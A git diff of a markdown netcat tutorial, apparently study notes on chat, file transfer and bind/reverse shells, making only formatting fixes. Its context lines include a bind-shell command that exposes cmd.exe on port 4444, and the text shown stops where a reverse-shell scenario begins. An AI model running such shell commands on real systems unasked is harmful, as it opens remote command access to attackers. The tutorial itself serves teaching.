@@ -19,6 +19,7 @@ nc -n -v <DESTINATION IP> <PORT>
 ## 1.2 - LISTENING ON A TCP/UDP PORT
 + Usefull for recieving in network connections
 + Making a chat server using netcat
+
 ```bash
 # server for listening
 nc -lvnp <PORT>
@@ -38,6 +39,7 @@ nc <IP ADDRESS> <PORT>
 + We can transfer files using netcat like server/client chat example with some minor differences
 + We should guess when the transfer is done based on file size
 + We can confirm that the file is transfered successfully by calculating sha256 hash
+
 ```bash
 # Server which recieves the file
 nc -lvnp <PORT> > /path/to/file
@@ -50,7 +52,7 @@ nc <IP ADDRESS> <PORT> < /path/to/file
 + netcat has command redirection
 + It can redirect input/output of an executable to a TCP/UDP port
 
-![01](./images/01)
+![01](./images/01.png)
 
 Bob is running Windows and Alice is running Linux\
 In first scenario Alice wants to connect to Bob's machine and do stuff
@@ -59,6 +61,7 @@ In first scenario Alice wants to connect to Bob's machine and do stuff
 + Bob starts netcat as server and bind `cmd.exe` to port 4444
 + netcat bind `cmd.exe` to port 4444 and redirect input/output/error of `cmd.exe` to port 4444
 + So anyone connecting to Bob's IP address on port 4444 wil be prompted `cmd.exe` and his WIndows comand prompt shell
+
 ```bash
 # Bob's Windows machine as a server
 nc -lvnp 4444 -e cmd.exe
@@ -69,7 +72,7 @@ nc -nv <Bob IP> 4444
 ```
 
 
-![02](./images/02)
+![02](./images/02.png)
 In second scenario Bob wants to connect to Alice's computer and do stuff
 **netcat reverse shell scenario**
 + First Bob starts netcat on port 4444 on his Windows machine
